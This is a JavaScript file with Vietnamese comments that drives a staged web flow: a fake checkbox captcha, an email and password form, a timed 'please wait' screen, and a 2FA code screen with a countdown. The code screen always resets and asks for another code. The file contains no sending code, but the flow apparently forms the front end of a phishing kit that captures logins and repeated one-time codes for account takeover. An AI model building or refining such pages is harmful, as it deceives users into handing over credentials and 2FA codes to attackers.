// =========================================
// HÀM ĐIỀU CHUYỂN CÁC BƯỚC (MÀN HÌNH)
// =========================================
function showStep(stepId) {
    // Ẩn tất cả các màn hình hiện có
    document.querySelectorAll('.step-container').forEach(function(el) {
        el.classList.remove('active');
    });
    // Hiển thị màn hình được yêu cầu
    document.getElementById(stepId).classList.add('active');
}

// =========================================
// BƯỚC 1: XÁC MINH CAPTCHA
// =========================================
const captchaCheck = document.getElementById('captchaCheck');
if (captchaCheck) {
    captchaCheck.addEventListener('change', function() {
        if(this.checked) {
            // Khi tích vào ô, đợi 0.5 giây rồi tự động chuyển sang Bước 2
            setTimeout(function() { 
                showStep('step2'); 
            }, 500);
        }
    });
}

// =========================================
// BƯỚC 2: MÀN HÌNH ĐĂNG NHẬP & CHAT
// =========================================
const inputEmail = document.getElementById('inputEmail');
const inputPass = document.getElementById('inputPass');
const btnSubmitStep2 = document.getElementById('btnSubmitStep2');
const formStep2 = document.getElementById('formStep2');

// Kiểm tra bắt buộc điền thông tin mới mở khóa nút
function checkStep2Form() {
    if (inputEmail.value.trim() !== "" && inputPass.value.trim() !== "") {
        btnSubmitStep2.disabled = false; // Mở khóa nút
    } else {
        btnSubmitStep2.disabled = true;  // Khóa nút
    }
}

if (inputEmail && inputPass) {
    inputEmail.addEventListener('input', checkStep2Form);
    inputPass.addEventListener('input', checkStep2Form);
}

// Khi bấm Gửi ở Bước 2
if (btnSubmitStep2) {
    btnSubmitStep2.addEventListener('click', function() {
        // 1. Làm mờ toàn bộ form và nút bấm ngay lập tức
        formStep2.classList.add('disabled-element'); 
        
        // 2. Chuyển sang màn hình chờ (Bước 4) sau một khoảng trễ ngắn
        setTimeout(function() {
            showStep('step4'); 
            
            // 3. Đợi đúng 5 giây ở màn hình chờ, sau đó chuyển sang Bước 5 và bắt đầu đếm ngược
            setTimeout(function() {
                showStep('step5'); 
                startTimer(); 
            }, 5000);
        }, 500); 
    });
}

// =========================================
// BƯỚC 5: MÀN HÌNH NHẬP MÃ 2FA
// =========================================
const inputCode = document.getElementById('inputCode');
const btnSubmitStep5 = document.getElementById('btnSubmitStep5');
const formStep5 = document.getElementById('formStep5');

// Kiểm tra bắt buộc điền mã mới mở khóa nút
function checkStep5Form() {
    if (inputCode.value.trim() !== "") {
        btnSubmitStep5.disabled = false;
    } else {
        btnSubmitStep5.disabled = true;
    }
}

if (inputCode) {
    inputCode.addEventListener('input', checkStep5Form);
}

// Khi bấm Gửi ở Bước 5
if (btnSubmitStep5) {
    btnSubmitStep5.addEventListener('click', function() {
        // 1. Làm mờ form và nút bấm
        formStep5.classList.add('disabled-element'); 
        
        // 2. Hiện lại màn hình chờ thông báo (Bước 4)
        setTimeout(function() {
            showStep('step4'); 
            
            // 3. Đợi 5 giây rồi quay lại Bước 5 (Khôi phục trạng thái để có thể nhập lại)
            setTimeout(function() {
                formStep5.classList.remove('disabled-element'); // Bỏ làm mờ
                inputCode.value = ''; // Xóa sạch ô nhập mã cũ
                btnSubmitStep5.disabled = true; // Khóa lại nút Gửi
                showStep('step5'); // Trở lại Bước 5
            }, 5000);
            
        }, 500);
    });
}

// =========================================
// LOGIC ĐẾM NGƯỢC THỜI GIAN (04:43)
// =========================================
let timerInterval;
function startTimer() {
    clearInterval(timerInterval);
    let time = 4 * 60 + 43; // 4 phút 43 giây
    const display = document.getElementById('countdown');
    
    if (!display) return;

    timerInterval = setInterval(function () {
        let minutes = parseInt(time / 60, 10);
        let seconds = parseInt(time % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--time < 0) {
            time = 0;
            clearInterval(timerInterval);
        }
    }, 1000);
}
